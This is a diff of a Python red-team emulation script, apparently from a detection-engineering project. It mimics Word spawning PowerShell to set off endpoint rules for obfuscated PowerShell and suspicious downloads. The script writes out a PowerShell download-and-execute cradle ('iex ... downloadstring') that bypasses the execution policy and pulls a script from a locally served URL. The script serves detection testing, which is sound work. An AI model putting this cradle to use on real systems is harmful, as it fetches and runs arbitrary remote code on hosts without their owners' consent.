@@ -3,46 +3,50 @@
 # 2.0; you may not use this file except in compliance with the Elastic License
 # 2.0.
 
-# Name: Suspicious PowerShell Download
-# RTA: suspicious_powershell_download.py
-# signal.rule.name: Suspicious MS Office Child Process
-# ATT&CK: T1086
-# Description: PowerShell using DownloadString or DownloadFile in suspicious context
-
 import os
 import time
 
 from . import common
 
-PLATFORMS = [common.WINDOWS]
+PLATFORMS = ["windows"]
 TRIGGERED_RULES = {
-    "SIEM": [{"rule_id": "a624863f-a70d-417f-a7d2-7a404638d47f", "rule_name": "Suspicious MS Office Child Process"}],
-    "ENDPOINT": []
+    "SIEM": [],
+    "ENDPOINT": [
+        {
+            "rule_name": "PowerShell Obfuscation Spawned via Microsoft Office",
+            "rule_id": "93ef8a09-0f8d-4aa1-b0fb-47d5d5b40cf2",
+        },
+        {
+            "rule_name": "Suspicious PowerShell Downloads",
+            "rule_id": "7200673e-588c-45d5-be48-bc5c7a908d6b",
+        },
+    ],
 }
-TACTICS = []
-RTA_ID = "858f05e4-19b1-42bd-88dc-799e86775edc"
+TACTICS = ["TA0002", "TA0001"]
+RTA_ID = "20b96aa7-609e-473f-ac35-5ac19d10f9a5"
+EXE_FILE = common.get_path("bin", "renamed.exe")
+
 
 @common.requires_os(PLATFORMS)
 def main():
-    cmd_path = "c:\\windows\\system32\\cmd.exe"
     server, ip, port = common.serve_web()
-    url = 'http://{}:{}/bad.ps1'.format(ip, port)
+    url = "http://{}:{}/bad.ps1".format(ip, port)
 
-    cmds = ["powershell -ep bypass -c iex(new-object net.webclient).downloadstring('{}')".format(url),
-            "powershell -ep bypass -c (new-object net.webclient).downloadfile('{}', 'bad.exe')".format(url)]
+    cmd = "powershell -ep bypass -c iex(new-object net.webclient).downloadstring('{}')".format(
+        url
+    )
 
-    # emulate word and chrome
-    for user_app in ["winword.exe", "chrome.exe"]:
-        common.log("Emulating {}".format(user_app))
-        user_app_path = os.path.abspath(user_app)
-        common.copy_file(cmd_path, user_app_path)
+    # Emulate Word
+    user_app = "winword.exe"
+    common.log("Emulating {}".format(user_app))
+    user_app_path = os.path.abspath(user_app)
+    common.copy_file(EXE_FILE, user_app_path)
 
-        for cmd in cmds:
-            common.execute([user_app_path, "/c", cmd])
-            time.sleep(2)
+    common.execute([user_app_path, "/c", cmd])
+    time.sleep(2)
 
-        # cleanup
-        common.remove_file(user_app_path)
+    # Cleanup
+    common.remove_file(user_app_path)
 
 
 if __name__ == "__main__":
